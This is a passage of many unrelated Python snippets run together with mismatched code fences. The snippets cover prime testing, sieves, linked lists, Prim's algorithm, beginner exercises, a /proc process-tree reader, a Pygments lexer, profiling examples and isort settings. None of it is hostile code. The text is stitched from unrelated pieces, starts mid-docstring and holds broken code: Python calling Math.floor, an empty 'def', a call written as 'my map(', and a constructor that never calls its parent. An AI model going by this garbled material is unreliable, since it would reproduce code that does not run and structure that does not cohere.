        if N = a * b; where a<=b and a,b C (1, N)
        then, a * b >= a*a;
        which leads to => a*a <= N
                       => a <= sqrt(N)
    Hence checking only till the square root of N
    """
    upper_lim = Math.floor(Math.sqrt(number)) + 1
    is_prime = True if number != 1 else False

    for i in range(2, upper_lim):
        if number % i == 0:
            is_prime = False
            break
            # The moment there is a divisor of 'number', break the iteration, as the number is not prime

    return is_prime


while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        number = int(input("Number to Check : "))
        result = str(number)
        prime_status = is_number_prime(number)

        if prime_status:
            result += POSITIVE_MESSAGE
        else:
            result += NEGATIVE_MESSAGE
        print(result)
    else:
        print("Program Ended...")
        break

def prime_check(n):
    """Return True if n is a prime number
    Else return False.
    """

    if n <= 1:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0 or n % 3 == 0:
        return False
    j = 5
    while j * j <= n:
        if n % j == 0 or n % (j + 2) == 0:
            return False
        j += 6
    return True
````

````py
python/black : True```


```py
from __future__ import annotations


def prime_factors(n: int) -> list[int]:
    """
    Returns prime factors of n as a list.

    >>> prime_factors(0)
    []
    >>> prime_factors(100)
    [2, 2, 5, 5]
    >>> prime_factors(2560)
    [2, 2, 2, 2, 2, 2, 2, 2, 2, 5]
    >>> prime_factors(10**-2)
    []
    >>> prime_factors(0.02)
    []
    >>> x = prime_factors(10**241) # doctest: +NORMALIZE_WHITESPACE
    >>> x == [2]*241 + [5]*241
    True
    >>> prime_factors(10**-354)
    []
    >>> prime_factors('hello')
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'str'
    >>> prime_factors([1,2,'hello'])
    Traceback (most recent call last):
        ...
    TypeError: '<=' not supported between instances of 'int' and 'list'

    """
    i = 2
    factors = []
    while i * i <= n:
        if n % i:
            i += 1
        else:
            n //= i
            factors.append(i)
    if n > 1:
        factors.append(n)
    return factors


if __name__ == "__main__":
    import doctest

    doctest.testmod()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def main():
    for n in primes():
        if n < 1000:
            print(n)
        else:
            break


def _odd_iter():
    n = 1
    while True:
        n = n + 2
        yield n


def _not_divisible(n):
    return lambda x: x % n > 0


def primes():
    yield 2
    it = _odd_iter()
    while True:
        n = next(it)
        yield n
        it = filter(_not_divisible(n), it)


if __name__ == "__main__":
    main()

# flake8: noqa
````

````py
Sieve of Eratosthenes

Input : n =10
Output: 2 3 5 7

Input : n = 20
Output: 2 3 5 7 11 13 17 19

you can read in detail about this at
https://en.wikipedia.org/wiki/Sieve_of_Eratosthenes```


```py


def prime_sieve_eratosthenes(num):
    """
    print the prime numbers up to n

    >>> prime_sieve_eratosthenes(10)
    2,3,5,7,
    >>> prime_sieve_eratosthenes(20)
    2,3,5,7,11,13,17,19,
    """

    primes = [True for i in range(num + 1)]
    p = 2

    while p * p <= num:
        if primes[p]:
            for i in range(p * p, num + 1, p):
                primes[i] = False
        p += 1

    for prime in range(2, num + 1):
        if primes[prime]:
            print(prime, end=",")


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    num = int(input())

    prime_sieve_eratosthenes(num)
````

````py
ID: c3f603f7-26a5-44d3-9295-15dab653187d

Python Algorithms, Page 153
https://en.wikipedia.org/wiki/Prim%27s_algorithm```


```py
from collections.abc import Mapping
from heapq import heappop, heappush
from typing import Optional

from src.typehints import Node


def prims(graph: Mapping[Node, Mapping[Node, int]], start: Node) -> dict[Node, Optional[Node]]:
    """Find the minimum spanning tree of an undirected, weighted graph."""
    parents = {}
    to_visit = [(0, None, start)]
    while to_visit:
        weight, parent, node = heappop(to_visit)
        if node in parents:
            continue
        parents[node] = parent
        for next_node, weight in graph[node].items():
            heappush(to_visit, (weight, node, next_node))
    return parents

from typing import List


class Node:
    def __init__(self, data=None):
        self.data = data
        self.next = None

    def __repr__(self):
        """Returns a visual representation of the node and all its following nodes."""
        string_rep = []
        temp = self
        while temp:
            string_rep.append(f"{temp.data}")
            temp = temp.next
        return "->".join(string_rep)


def make_linked_list(elements_list: List):
    """Creates a Linked List from the elements of the given sequence
    (list/tuple) and returns the head of the Linked List.
    >>> make_linked_list([])
    Traceback (most recent call last):
        ...
    Exception: The Elements List is empty
    >>> make_linked_list([7])
    7
    >>> make_linked_list(['abc'])
    abc
    >>> make_linked_list([7, 25])
    7->25
    """
    if not elements_list:
        raise Exception("The Elements List is empty")

    current = head = Node(elements_list[0])
    for i in range(1, len(elements_list)):
        current.next = Node(elements_list[i])
        current = current.next
    return head


def print_reverse(head_node: Node) -> None:
    """Prints the elements of the given Linked List in reverse order
    >>> print_reverse([])
    >>> linked_list = make_linked_list([69, 88, 73])
    >>> print_reverse(linked_list)
    73
    88
    69
    """
    if head_node is not None and isinstance(head_node, Node):
        print_reverse(head_node.next)
        print(head_node.data)


def main():
    from doctest import testmod

    testmod()

    linked_list = make_linked_list([14, 52, 14, 12, 43])
    print("Linked List:")
    print(linked_list)
    print("Elements in Reverse:")
    print_reverse(linked_list)


if __name__ == "__main__":
    main()

from threading import Thread
from time import sleep


def printer():
    for i in range(3):
        print(i, end=" ")
        sleep(0.1)


thr = Thread(target=printer, daemon=True)
thr.start()
print()  # Add newline

from threading import Thread
from time import sleep


def printer():
    for i in range(3):
        print(i, end=" ")
        sleep(0.1)


thr = Thread(target=printer, daemon=True)
thr.start()
thr.join()
print()  # Add newline

x = 10
y = 2.24552
z = "I like turtles!"

# Using the printf operator (%), print the following feeding in the values of x,
# y, and z:
# x is 10, y is 2.25, z is "I like turtles!"

print("x is %d, y is %.2f, z is %s" % (x, y, z))

# Use the 'format' string method to print the same thing

print("x is {:d}, y is {:.2f}, z = {:s}".format(x, y, z))

# Finally, print the same thing using an f-string

print(f"x is {x}, y is {round(y,2)}, z is {z}")
````

````py
Python provides a number of ways to perform printing. Research
how to print using the printf operator, the `format` string
method, and by using f-strings.```


```py

x = 10
y = 2.24552
z = "I like turtles!"

# Using the printf operator (%), print the following feeding in the values of x,
# y, and z:
# x is 10, y is 2.25, z is "I like turtles!"
print("x is %d, y is %.2f, z is \"%s\"" % (x, y, z))

# Use the 'format' string method to print the same thing
print("x is {}, y is {:.2f}, z is \"{}\"".format(x, y, z))
# Finally, print the same thing using an f-string
print(f"x is {x}, y is {y:.2f}, z is \"{z}\"")```


```py
Implementation of priority queue using linear array.
Insertion - O(n)
Extract min/max Node - O(1)```


```py
import itertools


class PriorityQueueNode:
    def __init__(self, data, priority):
        self.data = data
        self.priority = priority

    def __repr__(self):
        return "{}: {}".format(self.data, self.priority)


class PriorityQueue:
    def __init__(self, items=None, priorities=None):
        """Create a priority queue with items (list or iterable).
        If items is not passed, create empty priority queue."""
        self.priority_queue_list = []
        if items is None:
            return
        if priorities is None:
            priorities = itertools.repeat(None)
        for item, priority in zip(items, priorities):
            self.push(item, priority=priority)

    def __repr__(self):
        return "PriorityQueue({!r})".format(self.priority_queue_list)

    def size(self):
        """Return size of the priority queue.
        """
        return len(self.priority_queue_list)

    def push(self, item, priority=None):
        """Push the item in the priority queue.
        if priority is not given, priority is set to the value of item.
        """
        priority = item if priority is None else priority
        node = PriorityQueueNode(item, priority)
        for index, current in enumerate(self.priority_queue_list):
            if current.priority < node.priority:
                self.priority_queue_list.insert(index, node)
                return
        # when traversed complete queue
        self.priority_queue_list.append(node)

    def pop(self):
        """Remove and return the item with the lowest priority.
        """
        # remove and return the first node from the queue
        return self.priority_queue_list.pop().data

# Consider using the modules imported above.
import copy
import random


class Hat:
    def __init__(self, **kwargs):
        self.contents = []
        for k, v in kwargs.items():
            self.contents += [k] * int(v)

    def draw(self, num):
        n = len(self.contents)
        if num >= n:
            return self.contents
        r = []
        for i in range(0, num):
            bid = random.randint(0, n - 1)
            r.append(self.contents.pop(bid))
            n -= 1

        return r


def experiment(hat, expected_balls, num_balls_drawn, num_experiments):
    count = 0
    for _ in range(0, num_experiments):
        h = copy.deepcopy(hat)
        balls = h.draw(num_balls_drawn)
        d = {}
        for b in balls:
            v = d.get(b, 0)
            d[b] = v + 1

        found = True
        for b, v in expected_balls.items():
            if d.get(b, 0) < v:
                found = False
                break

        if found:
            count += 1

    return count / num_experiments
````

````py
    How do you find and return the middle node of a singly linked list in one pass?
    You do not have access to the length of the list. If the list is even,
    you should return the first of the two "middle" nodes.

    - Traverse linked list using two pointers.
    - Move one pointer by one and other pointer by two.
    - When the fast pointer reaches end
    - slow pointer will reach middle of the linked list.```


```py

# node class
class Node:
    def __init__(self, value):
        self.value = value
        self.next = None

    # define add
    def add(self, value):
        self.next = Node(value)

    # define find middle
    def find_middle(self):
        # set the middle to self
        middle = self
        # set end to self
        end = self
        # while there are still nodes
        while end != None:
            # set end to ends next
            print(end.value)
            end = end.next
            # if end exists
            if end:
                # set end to ends next
                end = end.next
                # set middle to middles next
                middle = middle.next
        # print the value at the middle
        return f"Middle is: {middle.value}"

root = Node(3)
cur = root
cur.add(4)
cur = cur.next
cur.add(5)
cur = cur.next
cur.add(6)
cur = cur.next
cur.add(7)
cur = cur.next
print(cur.next)
print(root.find_middle())



class Node:
    def __init__(self, value):
        self.value = value
        self.next = None

    def add(self, value):
        self.next = Node(value)

    def find_middle(self):
        middle = self
        end = self

        while end != None:
            end = end.next
            if end:
                end = end.next
                middle = middle.next

        print(f"Middle Value: {middle.value}")

root = Node([1, 2, 4, 3, 23])
cur = root
cur.add({"name": "Tom"})
cur = cur.next
cur.add(9)
cur = cur.next
cur.add("bob")
cur = cur.next
cur.add(12)
cur = cur.next
cur.add("Bob")
cur = cur.next
cur.add(None)
cur = cur.next
cur.add(34)
cur = cur.next

root.find_middle()




class Node:
    def __init__(self, value):
        self.value = value
        self.next = None

    def add(self, value):
        self.next = Node(value)

    def reverse(self):
        cur = self
        new = cur.next
        cur.next = None # new tail?
        while new is not None:
            prev = cur
            cur = new
            new = cur.next
            cur.next = prev

        return cur

root = Node(3)
cur = root
cur.add(4)
cur = cur.next
cur.add(5)
cur = cur.next
cur.add(6)
cur = cur.next

cur = root
while cur:
    print(cur.value)
    cur = cur.next
    print("-----")
cur = root.reverse()
while cur:
    print(cur.value)
    cur = cur.next
####### WHILE LOOP #######
#
# In this problem, write a function named "my_while_filter" that accepts an
# iterable of integers as a parameter and returns a new list with only the even
# integers remaining. The function must use a while loop in its implementation,
# but not the built in filter.
#
# There are three sample data calls for you to use below.

# WRITE YOUR FUNCTION HERE


# TEST DATA
test1 = [2]
print("my_while_filter test1:", my_while_filter(test1))  # => [2]
test2 = list(range(40))
print(
    "my_while_filter test2:", my_while_filter(test2)
)  # => [2, 4, 6, 8, 10, 12, 14, 16, ... 38]
test3 = []
print("my_while_filter test3:", my_while_filter(test3))  # => []

# WHILE LOOP
#
# In this problem, write a function named "my_while_loop" that accepts an
# iterable of strings as a parameter and returns a new list with strings from
# the original list that are longer than five characters. The function must use
# a while loop in its implementation. The order of the strings in the new list
# must be in the same order they were in the old list.
#
# There are two sample data calls for you to use.

# WRITE YOUR FUNCTION HERE
def

# TEST DATA
test = ["nope", "yes this one", "not", "uhuh", "here's one", "narp"]
print(my_while_loop(test))  # > ["yes this one", "here's one"]

test = ["plop", "", "drop", "zop", "stop"]
print(my_while_loop(test))  # > []

test = []
print(my_while_loop(test))  # > []

# WHILE LOOP
#
# In this problem, write a function named "my_while_map" that accepts an
# iterable of strings as a parameter and returns a new list with strings from
# the original list that are all transformed to upper case. The function must
# use a while loop in its implementation.
#
# The str object in Python has a method on it named "upper".
#
# There are two sample data calls for you to use.

# WRITE YOUR FUNCTION HERE


# TEST DATA

test = ["plop", "", "drop", "zop", "stop"]
print(my_while_map(test))  # > ["PLOP", "", "DROP", "ZOP", "STOP"]

test = []
print(my_while_map(test))  # > []

####### FOR LOOP #######
#
# In this problem, write a function named "my_for_filter" that accepts an
# iterable of strings and a suffix str as parameters and returns a new list with
# strings from the original list if they end with the suffix. The function
# must use a for loop in its implementation, but not the built in filter.
#
# The str object in Python has a method on it named "endswith".
#
# There are two sample data calls for you to use.
#
# WRITE YOUR FUNCTION HERE


# TEST DATA
test1 = ["plop", "", "drip", "zop", "stop"]
print("my_for_filter test1:", my_for_filter(test1, "op"))  # => ["plop", "zop", "stop"]

test2 = ["plop", "", "drip", "zop", "stop"]
print("my_for_filter test2:", my_for_filter(test2, "mop"))  # => []

# FOR LOOP
#
# In this problem, write a function named "my_for_loop" that accepts an
# iterable of strings as a parameter and returns a new list with strings from
# the original list that are longer than five characters. The function must use
# a for loop in its implementation. The order of the strings in the new list
# must be in the same order they were in the old list.
#
# There are two sample data calls for you to use.

# WRITE YOUR FUNCTION HERE


# TEST DATA
test = ["nope", "yes this one", "not", "uhuh", "here's one", "narp"]
print(my_for_loop(test))  # > ["yes this one", "here's one"]

test = ["plop", "", "drop", "zop", "stop"]
print(my_for_loop(test))  # > []

test = []
print(my_for_loop(test))  # > []

# FOR LOOP
#
# In this problem, write a function named "my_for_map" that accepts an
# iterable of strings as a parameter and returns a new list with strings from
# the original list that are all transformed to upper case. The function must
# use a for loop in its implementation.
#
# The str object in Python has a method on it named "upper".
#
# There are two sample data calls for you to use.

# WRITE YOUR FUNCTION HERE


# TEST DATA
test = ["plop", "", "drop", "zop", "stop"]
print(my_for_map(test))  # > ["PLOP", "", "DROP", "ZOP", "STOP"]

test = []
print(my_for_map(test))  # > []

# LIST COMPREHENSION
#
# In this problem, write a function named "my_comprehension" that accepts an
# iterable of strings as a parameter and returns a new list with strings from
# the original list that are all transformed to upper case. The function must
# use a list comprehension in its implementation. Your function body must
# contain only one line.
#
# The str object in Python has a method on it named "upper".
#
# There are two sample data calls for you to use.

# WRITE YOUR FUNCTION HERE


# TEST DATA
test = ["plop", "", "drop", "zop", "stop"]
print(my_comprehension(test))  # > ["PLOP", "", "DROP", "ZOP", "STOP"]

test = []
print(my_comprehension(test))  # > []

####### LIST COMPREHENSION #######
#
# In this problem, write a function named "my_comprehension" that accepts an
# iterable of integers as a parameter and returns a new list containing the
# squared values from the original list. The function must use a list
# comprehension in its implementation. Your function body must contain only
# one line.
#
# There are two sample data calls for you to use.

# WRITE YOUR FUNCTION HERE


# TEST DATA
test1 = [1, 2, 3, 4]
print("my_comprehension test1:", my_comprehension(test1))  # => [1, 4, 9, 16]
test2 = []
print("my_comprehension test2:", my_comprehension(test2))  # => []

# IF STATEMENTS
#
# In this problem, write a function named "lossy_transform" that takes an
# integer parameter and returns the corresponding value found in this table
# | Input                                          | Output                 |
# |------------------------------------------------|------------------------|
# | Less than 10                                   | 0                      |
# | Greater than or equal to 10 and less than 47   | The input times 2      |
# | Greater than or equal to 47 and less than 1001 | The input divided by 3 |
# | Greater than or equal to 1001                  | None                   |
#
# That last output is the literal None, not a string.
#
# Your code must include at least one of each of the following keywords:
# * if
# * elif
# * else
#
# All inputs are guaranteed to be greater than 0.
#
# There are four sample data calls for you to use.

# WRITE YOUR FUNCTION HERE
def lossy_transform(num):
    if num < 10:
        return 0
    elif num < 47:
        return num * 2
    elif num < 1001:
        return num / 3
    else:
        return None


# TEST DATA
print(lossy_transform(8))  # > 0
print(lossy_transform(33))  # > 66
print(lossy_transform(99))  # > 33
print(lossy_transform(1002))  # > None

####### IF STATEMENTS #######
#
# In this problem, write a function named "good_or_bad" that takes
# an integer parameter and returns the corresponding value found in this table
#
# | Input                      | Output                  |
# |----------------------------|-------------------------|
# | "Coffee"                   | "Good"                  |
# | "Ice Cream"                | "Good"                  |
# | "Phone in Toilet"          | "Bad"                   |
# | "Sleeping through alarm"   | "Bad"                   |
# | "6 Pieces of plain bread"  | "Okay?"                 |
# | "Doe"                      | "A dear, a female dear" |
#
# If your function gets any other string than those listed in the input column,
# it should return None.
#
# Your code must include the following number of branching statements
# * 1 if statement
# * 3 elif statements
# * 1 else statement
#
# All inputs are guaranteed to be strings.
#
# There are seven sample data calls for you to use.

# WRITE YOUR FUNCTION HERE


# TEST DATA
print("good_or_bad test1:", good_or_bad("Coffee"))  # => "Good"
print("good_or_bad test2:", good_or_bad("Ice Cream"))  # => "Good"
print("good_or_bad test3:", good_or_bad("Phone in Toilet"))  # => "Bad"
print("good_or_bad test4:", good_or_bad("Sleeping through alarm"))  # => "Bad"
print("good_or_bad test5:", good_or_bad("6 Pieces of plain bread"))  # => "Okay?"
print("good_or_bad test6:", good_or_bad("Doe"))  # => "A dear, a female dear"
print(
    "good_or_bad test7:", good_or_bad("Jokes Ed or Justin made that are funny")
)  # => None

# CLASS DECLARATION
#
# Declare a class named "Airport" with the following features:
#
# * A constructor that takes two values: a name and an abbreviation
# * A method named "plane_arrives" that increases the number of planes parked at
#   the airport by 1.
# * A method named "plane_departs" that decreases the number of planes parked at
#   the airport by 1
# * A method named "get_number_of_planes" that returns the current number of
#   planes parked at the airport. That number should be 0 when the object is
#   first created.
# * A method named "__repr__" that returns a string with the following format:
#
#     "<{airport abbreviation} {number of planes at the airport}"
#
#   An example would be "<LAX 12>"

# WRITE YOUR CODE HERE
class Airport:
    def __init__(self, name, abbr):
        self._name = name
        self._abbr = abbr
        self._parked_planes = 0

    def plane_arrives(self):
        self._parked_planes += 1

    def plane_departs(self):
        self._parked_planes -= 1

    def get_number_of_planes(self):
        return self._parked_planes

    def __repr__(self):
        return f"<{self._abbr} {self._parked_planes}>"

# INHERITANCE
#
# Define two classes in this file.
#
# The "Employee" class must have no constructor. It can be an empty class.
#
# The "Manager" class should inherit from the "Employee" class. It should have
# an empty constructor. It can be an empty class.

# WRITE YOUR CODE HERE
class Employee:
    pass


class Manager(Employee):
    def __init__(self):
        super().__init__

# DICTIONARY
#
# Write a function named "my_map" that takes a dictionary as a parameter.
# Return another dictionary that consists of the key/value pairs from the
# argument where the values are tripled. Use any construct that you want to
# implement "my_map".
#
#
#
#  --- YOUR CODE HERE ---




#
#  ------ EXAMPLES ------
#
print('filter', my_map({1: ".", 2: "..", 5: "..."}))     # => {1: "...", 2: "......", 3: "........."}
print('filter', my_map({}))                              # => {}
print('filter', my map({1: 2, 2: 33, 5: 14}))            # => {1: 6, 2: 99, 5: 42}

# DICTIONARY
#
# Write a function named "my_filter" that takes a dictionary as a parameter.
# Return another dictionary that consists of the key/value pairs from the
# argument where the value has a length less than or equal to 3. Use any
# construct that want to implement "my_filter".
#
# Test data follows.

# WRITE YOUR CODE HERE


# TEST DATA
print(my_filter({1: ".", 2: "..", 5: "....."}))  # > {1: ".", 2: ".."}
print(my_filter({}))  # > {}
print(my_filter({1: ".....", 2: "....", 5: ""}))  # > {5: ""}

# BUILTINS
#
# Write a function named "filter_s_words" that accepts an iterable
#   containing strings and returns a list of the lists that have at least
#   one 's' character.
#
#  Use the "filter" method to do this.
#
#
#
#
#  --- YOUR CODE HERE ---


#
#  ------ EXAMPLES ------
#
words = ["sassafras", "succotash", "balderdash", "ginger", "cinamon", "dog"]
print(filter_s_words(words))  # => ["sassafras", "succotash", "balderdash"]

# BUILTINS
#
# Write a function named "filter_small_lists" that accepts an iterable
# containing lists and returns a list of the lists that have more than two
# elements in them.
#
# Use the "filter" method to do this.
#
# Test data is at the bottom.

# WRITE YOUR CODE HERE


# TEST DATA
print(filter_small_lists([[1], [1, 2], [1, 2, 3], [1, 2, 3, 4]]))
# Prints [[1, 2, 3], [1, 2, 3, 4]]

print(filter_small_lists([]))  # > []

# GETTERS AND SETTERS
#
# Create a class "GetItSetIt" that will be initialized with a single value
#   Write a getter and a setter for this value
#   Write a method called forget which will assign the value to None
#
#
#
#  --- YOUR CODE HERE ---


#
#  ------ EXAMPLES ------
#

get_set = GetItSetIt("my super secret secret")
print(get_set.value)  # => "my super secret secret"

get_set.value = "my even secreter secret"
print(get_set.value)  # => "my even secreter secret"

get_set.forget()
print(get_set.value)  # => None

# GETTERS AND SETTERS
#
# Create a class named "ValueHolder". On the class, create:
# * A constructor that takes self and one argument and sets the value of the
#   value holder to the value passed in
# * A getter property named "value" that returns the value of the object
# * A setter property named "value" that will only set the value of the object
#   if the provided value is not None
#
# Test data is below.

# WRITE YOUR CODE HERE


# Test data
o = ValueHolder("boop")
print(o.value)  # > "boop"

o.value = 2
print(o.value)  # > 2

o.value = None
print(o.value)  # > 2

#  Write a function "comparison" that takes in a single parameter, a function.
#
#  "comparison" will return another function that accepts list containing 2
#     numbers.
#
#  Each of these numbers will be invoked on the original function recieved as
#      an argument by "comparison".
#
#  When the numbers are invoked on the original function we will compare the
#     return values:
#
#     If the return value of the first number is greater than the return value
#     of the second number:
#          return 1
#     If the return value of the first number is less than than the return value
#     of the second number:
#          return -1
#     If the return value of the first number is equal to the return value of
#     the second number:
#          return 0
#
#
#
#  --- YOUR CODE HERE ---


#
#  ------ EXAMPLES ------
#


def negation(num):
    return num * -1


neg = comparison(negation)
print(neg(1, 3))  # => 1
print(neg(5, 3))  # => -1
print(neg(7, 7))  # => 0


def times_zero(num):
    return num * 0


zeroed = comparison(times_zero)
print(zeroed(1, 3))  # => 0
print(zeroed(5, 3))  # => 0


def nth_perfect_square(num):
    odds = list(filter(lambda num: num % 2, range(abs(num) * 2)))
    return sum(odds)


compare_perf_sqrs = comparison(nth_perfect_square)
print(compare_perf_sqrs(1, 3))  # => -1
print(compare_perf_sqrs(5, 3))  # => 1
print(compare_perf_sqrs(-4, 4))  # => 0

# FUNCTIONS
#
# Create a function named "bind_argument" that takes two parameters:
# 1. Any kind of value
# 2. A function
#
# Have "bind_argument" return a new function that invokes the function passed
# in as the second parameter to "bind_argument" with the value passed in as the
# first parameter to "bind_argument".
#
# Examples below.

# WRITE YOUR CODE HERE
def bind_argument(value, func):
    def bound():
        return func(value)

    return bound


# Example calls


def hello(name):
    return f"Hello, {name}"


bound = bind_argument("Poppy", hello)
print(bound())  # > "Hello, Poppy"

bound = bind_argument(2, lambda n: n * 100)
print(bound())  # > 200


# ******************************STUDY*****************************************

import io
import os
import re
import sys

from ._core import Process


STAT_PPID = 3
STAT_TTY = 6

STAT_PATTERN = re.compile(r'\(.+\)|\S+')


def detect_proc():
    """Detect /proc filesystem style.

    This checks the /proc/{pid} directory for possible formats. Returns one of
    the followings as str:

    * `stat`: Linux-style, i.e. ``/proc/{pid}/stat``.
    * `status`: BSD-style, i.e. ``/proc/{pid}/status``.
    """
    pid = os.getpid()
    for name in ('stat', 'status'):
        if os.path.exists(os.path.join('/proc', str(pid), name)):
            return name
    raise ProcFormatError('unsupported proc format')


def _get_stat(pid, name):
    path = os.path.join('/proc', str(pid), name)
    with io.open(path, encoding='ascii', errors='replace') as f:
        # We only care about TTY and PPID -- all numbers.
        parts = STAT_PATTERN.findall(f.read())
        return parts[STAT_TTY], parts[STAT_PPID]


def _get_cmdline(pid):
    path = os.path.join('/proc', str(pid), 'cmdline')
    encoding = sys.getfilesystemencoding() or 'utf-8'
    with io.open(path, encoding=encoding, errors='replace') as f:
        # XXX: Command line arguments can be arbitrary byte sequences, not
        # necessarily decodable. For Shellingham's purpose, however, we don't
        # care. (pypa/pipenv#2820)
        # cmdline appends an extra NULL at the end, hence the [:-1].
        return tuple(f.read().split('\0')[:-1])


class ProcFormatError(EnvironmentError):
    pass


def get_process_mapping():
    """Try to look up the process tree via the /proc interface.
    """
    stat_name = detect_proc()
    self_tty = _get_stat(os.getpid(), stat_name)[0]
    processes = {}
    for pid in os.listdir('/proc'):
        if not pid.isdigit():
            continue
        try:
            tty, ppid = _get_stat(pid, stat_name)
            if tty != self_tty:
                continue
            args = _get_cmdline(pid)
            processes[pid] = Process(args=args, pid=pid, ppid=ppid)
        except IOError:
            # Process has disappeared - just ignore it.
            continue
    return processes
````

````py
    pygments.lexers.procfile
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexer for Procfile file format.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Name, Number, String, Text, Punctuation

__all__ = ["ProcfileLexer"]


class ProcfileLexer(RegexLexer):
    """
    Lexer for Procfile file format.

    The format is used to run processes on Heroku or is used by Foreman or
    Honcho tools.
    For more information about the definition of the format, see:
    https://devcenter.heroku.com/articles/procfile#procfile-format

    .. versionadded:: 2.10
    """
    name = 'Procfile'
    aliases = ['procfile']
    filenames = ['Procfile']

    tokens = {
        'root': [
            (r'^([a-z]+)(:)', bygroups(Name.Label, Punctuation)),
            (r'\s+', Text.Whitespace),
            (r'"[^"]*"', String),
            (r"'[^']*'", String),
            (r'[0-9]+', Number.Integer),
            (r'\$[a-zA-Z_][\w]*', Name.Variable),
            (r'(\w+)(=)(\w+)', bygroups(Name.Variable, Punctuation, String)),
            (r'([\w\-\./]+)', Text),
        ],
    }
````

````py
Given an array nums of n integers where n > 1,  return an array output such that output[i] is equal to the product of all the elements of nums except nums[i].

Example:
Input:  [1,2,3,4]
Output: [24,12,8,6]```


```py


def productExceptSelf(nums):
    # create ans array to store the left product of every element and them multi it by the right product
    ans = [0] * len(nums)
    ans[0] = 1
    for i in range(1, len(nums)):
        ans[i] = ans[i - 1] * nums[i - 1]

    r = 1
    for i in range(len(nums) - 1, -1, -1):
        ans[i] = ans[i] * r
        r *= nums[i]
    return ans


print(productExceptSelf([2, 2, 3, 4]))
````

````py
Product of Array Except Self

Given an array nums of n integers where n > 1,
return an array output such that output[i] is equal to the product of all the elements of nums except nums[i].
Note: Please solve it without division and in O(n).
Follow up:
Could you solve it with constant space complexity?
(The output array does not count as extra space for the purpose of space complexity analysis.)

Input: [1, 2, 3, 4]
Output: [24, 12, 8, 6]

=========================================
2 iterations, one from front and the second from back.
Make the products as this: from 0 to i-1 and from i-1 to N-1, and in the end only multiply these 2 products.
    Time Complexity:    O(N)
    Space Complexity:   O(N)    , According to the desciption O(1), the result array is not couted as extra space.```


```py


############
# Solution #
############


def product_except_self(nums):
    n = len(nums)
    if n == 0:
        return []

    mult = 1
    res = [1]
    i = 0

    # all products from right to left
    while i < n - 1:
        mult *= nums[i]
        res.append(mult)
        i += 1

    mult = 1
    i = n - 2

    # all products from left to right
    while i >= 0:
        mult *= nums[i + 1]
        res[i] *= mult
        i -= 1

    return res


###########
# Testing #
###########

# Test 1
# Correct result => [24, 12, 8, 6]
print(product_except_self([1, 2, 3, 4]))

#

#end_pymotw_header
import functools
import profile


@functools.lru_cache(maxsize=None)
def fib(n):
    # from literateprograms.org
    # http://bit.ly/hlOQ5m
    if n == 0:
        return 0
    elif n == 1:
        return 1
    else:
        return fib(n - 1) + fib(n - 2)


def fib_seq(n):
    seq = []
    if n > 0:
        seq.extend(fib_seq(n - 1))
    seq.append(fib(n))
    return seq


if __name__ == '__main__':
    profile.run('print(fib_seq(20)); print()')

#

#end_pymotw_header
import profile


def fib(n):
    # from literateprograms.org
    # http://bit.ly/hlOQ5m
    if n == 0:
        return 0
    elif n == 1:
        return 1
    else:
        return fib(n - 1) + fib(n - 2)


def fib_seq(n):
    seq = []
    if n > 0:
        seq.extend(fib_seq(n - 1))
    seq.append(fib(n))
    return seq


profile.run('print(fib_seq(20)); print()')

```









---


```py


#end_pymotw_header
import profile
from profile_fibonacci_memoized import fib, fib_seq

if __name__ == '__main__':
    profile.runctx(
        'print(fib_seq(n)); print()',
        globals(),
        {'n': 20},
    )

```









---


```py


#end_pymotw_header
import cProfile as profile
import pstats
from profile_fibonacci_memoized import fib, fib_seq

# Create 5 set of stats
for i in range(5):
    filename = 'profile_stats_{}.stats'.format(i)
    profile.run('print({}, fib_seq(20))'.format(i), filename)

# Read all 5 stats files into a single object
stats = pstats.Stats('profile_stats_0.stats')
for i in range(1, 5):
    stats.add('profile_stats_{}.stats'.format(i))

# Clean up filenames for the report
stats.strip_dirs()

# Sort the statistics by the cumulative time spent
# in the function
stats.sort_stats('cumulative')

stats.print_stats()

```









---


```py


#end_pymotw_header
import cProfile as profile
import pstats
from profile_fibonacci_memoized import fib, fib_seq

# Read all 5 stats files into a single object
stats = pstats.Stats('profile_stats_0.stats')
for i in range(1, 5):
    stats.add('profile_stats_{}.stats'.format(i))
stats.strip_dirs()
stats.sort_stats('cumulative')

print('INCOMING CALLERS:')
stats.print_callers('\(fib')

print('OUTGOING CALLEES:')
stats.print_callees('\(fib')

```









---


```py


#end_pymotw_header
import profile
import pstats
from profile_fibonacci_memoized import fib, fib_seq

# Read all 5 stats files into a single object
stats = pstats.Stats('profile_stats_0.stats')
for i in range(1, 5):
    stats.add('profile_stats_{}.stats'.format(i))
stats.strip_dirs()
stats.sort_stats('cumulative')

# limit output to lines with "(fib" in them
stats.print_stats('\(fib')
````

```pyCommon profiles are defined here to be easily used within a project using --profile {name}"""
from typing import Any, Dict

black = {
    "multi_line_output": 3,
    "include_trailing_comma": True,
    "force_grid_wrap": 0,
    "use_parentheses": True,
    "ensure_newline_before_comments": True,
    "line_length": 88,
}
django = {
    "combine_as_imports": True,
    "include_trailing_comma": True,
    "multi_line_output": 5,
    "line_length": 79,
}
pycharm = {
    "multi_line_output": 3,
    "force_grid_wrap": 2,
    "lines_after_imports": 2,
}
google = {
    "force_single_line": True,
    "force_sort_within_sections": True,
    "lexicographical": True,
    "single_line_exclusions": ("typing",),
    "order_by_type": False,
    "group_by_package": True,
}
open_stack = {
    "force_single_line": True,
    "force_sort_within_sections": True,
    "lexicographical": True,
}
plone = {
    "force_alphabetical_sort": True,
    "force_single_line": True,
    "lines_after_imports": 2,
    "line_length": 200,
}
attrs = {
    "atomic": True,
    "force_grid_wrap": 0,
    "include_trailing_comma": True,
    "lines_after_imports": 2,
    "lines_between_types": 1,
    "multi_line_output": 3,
    "use_parentheses": True,
}
hug = {
    "multi_line_output": 3,
    "include_trailing_comma": True,
    "force_grid_wrap": 0,
    "use_parentheses": True,
    "line_length": 100,
}
wemake = {
    "multi_line_output": 3,
    "include_trailing_comma": True,
    "use_parentheses": True,
    "line_length": 80,
}
appnexus = {
    **black,
    "force_sort_within_sections": True,
